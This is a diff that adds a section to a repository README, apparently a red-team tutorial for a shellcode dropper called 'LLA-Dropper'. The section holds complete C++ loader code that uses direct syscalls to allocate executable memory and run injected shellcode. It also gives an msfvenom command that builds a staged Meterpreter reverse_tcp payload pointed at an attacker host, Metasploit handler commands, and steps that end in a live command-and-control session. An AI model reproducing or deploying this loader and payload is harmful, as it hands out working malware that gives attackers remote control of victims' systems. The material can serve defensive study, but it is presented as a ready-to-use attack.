@@ -102,9 +102,99 @@ Customisations.
 <details>
  
 <p align="center">
+<img width="950" alt="image" src="https://user-images.githubusercontent.com/50073731/235471947-4bcd23fc-5093-4f4d-adc8-eb3ef36f139f.png">    
 <img width="1237" alt="image" src="https://user-images.githubusercontent.com/50073731/235458968-e330799e-51ff-46bf-97ab-c7d3be7ea079.png">
 <img width="778" alt="image" src="https://user-images.githubusercontent.com/50073731/235459219-4387dc48-56f8-481c-b978-1b786843a836.png">
     
 </details>
 
+Here is the **complete code**, and you can copy and paste this code into your **LLA-Dropper** project in Visual Studio.
+You can also download the complete **LLA-Dropper Visual Studio project** in the **Code Example section** of this repository.
+<details>
+    
+```
+#include <iostream>
+#include <Windows.h>
+#include "syscalls.h"
 
+int main() {
+    // Insert Meterpreter shellcode
+    unsigned char code[] = " ";
+
+    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
+    // 'exec' will hold the base address of the allocated memory region
+    void* exec = NULL;
+    SIZE_T size = sizeof(code);
+    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // Copy the shellcode into the allocated memory region
+    SIZE_T bytesWritten;
+    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
+
+    // Execute the shellcode in memory using a new thread
+    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
+    HANDLE hThread;
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
+
+    // Wait for the end of the thread to ensure the shellcode execution is complete
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+
+
+    // Return 0 as the main function exit code
+    return 0;
+}
+```
+</details>
+
+    
+    
+    
+## Meterpreter Shellcode
+Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
+<details>
+    
+ **kali>**   
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
+```
+<p align="center">
+<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
+</p>
+
+The shellcode can then be copied into the LLA-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
+<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
+</p>
+</details>    
+
+
+## MSF-Listener
+Before we test the functionality of our LLA-Dropper, we need to create a listener within msfconsole.
+<details>
+    
+**kali>**
+```
+msfconsole
+```
+**msf>**
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost IPv4_Redirector_or_IPv4_Kali
+set lport 80 
+set exitonsession false
+run
+```
+<p align="center">
+<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
+</p>
+</details>
+ 
+    
+Once the listener has been successfully started, you can run your compiled LLA-Dropper.exe. If all goes well, you should see an incoming command and control session 
+<details>
+    
+<p align="center">
+<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
+</p>
+</details>
+        
